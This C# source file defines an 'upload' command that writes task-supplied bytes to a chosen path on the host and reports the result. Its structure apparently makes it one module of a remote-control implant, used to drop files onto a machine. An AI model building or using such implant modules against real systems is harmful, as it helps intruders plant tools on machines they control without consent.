using System;
using System.IO;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Upload : EngineerCommand
    {
        public override string Name => "upload";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/dest", out string destination);

                if (string.IsNullOrWhiteSpace(destination))
                {
                    destination = Environment.CurrentDirectory;
                }
                var contentbytes = task.File;
                if(contentbytes.Length == 0)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: Missing file content to upload", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                }
                File.WriteAllBytes(destination, contentbytes);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("file uploaded at " + destination, task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
